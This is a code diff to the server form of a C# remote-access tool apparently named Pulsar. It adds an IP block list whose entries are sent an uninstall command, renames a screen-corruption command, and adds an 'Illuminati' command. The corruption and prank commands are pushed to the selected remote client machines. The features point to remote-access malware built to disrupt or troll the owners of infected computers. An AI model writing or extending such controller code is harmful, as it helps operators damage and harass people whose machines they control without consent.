@@ -432,24 +432,47 @@ namespace Pulsar.Server.Forms
             }
         }
 
+        private bool IsClientBlocked(string clientAddress)
+        {
+            string filePath = "blocked.json";
+
+            try
+            {
+                string json = File.ReadAllText(filePath);
+                var blockedIPs = System.Text.Json.JsonSerializer.Deserialize<List<string>>(json);
+                return blockedIPs.Contains(clientAddress.ToString());
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+        }
+
         private void ClientConnected(Client client)
         {
-            lock (_clientConnections)
+            if (IsClientBlocked(client.EndPoint.Address.ToString()))
             {
-                if (!ListenServer.Listening) return;
-                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
+                client.Send(new DoClientUninstall());
+                EventLog("Blocked IP Attempted to connect " + client.EndPoint.Address, "error");
             }
-
-            lock (_processingClientConnectionsLock)
+            else
             {
-                if (!_processingClientConnections)
+                lock (_clientConnections)
                 {
-                    _processingClientConnections = true;
-                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
+                    if (!ListenServer.Listening) return;
+                    _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
                 }
-            }
 
-            UpdateConnectedClientsCount();
+                lock (_processingClientConnectionsLock)
+                {
+                    if (!_processingClientConnections)
+                    {
+                        _processingClientConnections = true;
+                        ThreadPool.QueueUserWorkItem(ProcessClientConnections);
+                    }
+                }
+                UpdateConnectedClientsCount();
+            }
         }
 
         private void ClientDisconnected(Client client)
@@ -1451,11 +1474,19 @@ namespace Pulsar.Server.Forms
             }
         }
 
-        private void pixelCorruptToolStripMenuItem_Click(object sender, EventArgs e)
+        private void screenCorruptToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoPixelCorrupt());
+                c.Send(new DoScreenCorrupt());
+            }
+        }
+
+        private void illuminatiToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoIlluminati());
             }
         }
 
@@ -1949,6 +1980,43 @@ namespace Pulsar.Server.Forms
         private void sorterToolStripMenuItem_Click(object sender, EventArgs e)
         {
             MainTabControl.SelectTab(tabPage5);
+        }
+
+        private void blockIPToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count == 0) return;
+            if (
+                MessageBox.Show(
+                    string.Format(
+                        "Are you sure you want to Block {0} IP\\s?",
+                        lstClients.SelectedItems.Count), "Block Confirmation", MessageBoxButtons.YesNo,
+                    MessageBoxIcon.Question) == DialogResult.Yes)
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    string clientAddress = c.EndPoint.Address.ToString();
+                    string filePath = "blocked.json";
+                    List<string> blockedIPs = new List<string>();
+                    try
+                    {
+                        if (File.Exists(filePath))
+                        {
+                            string json = File.ReadAllText(filePath);
+                            blockedIPs = System.Text.Json.JsonSerializer.Deserialize<List<string>>(json) ?? new List<string>();
+                        }
+                        if (!blockedIPs.Contains(clientAddress.ToString()))
+                        {
+                            blockedIPs.Add(clientAddress.ToString());
+                        }
+                        string updatedJson = System.Text.Json.JsonSerializer.Serialize(blockedIPs, new JsonSerializerOptions { WriteIndented = true });
+                        File.WriteAllText(filePath, updatedJson);
+                    }
+                    catch (Exception)
+                    {
+                    }
+                    c.Send(new DoClientUninstall());
+                }
+            }
         }
     }
 }
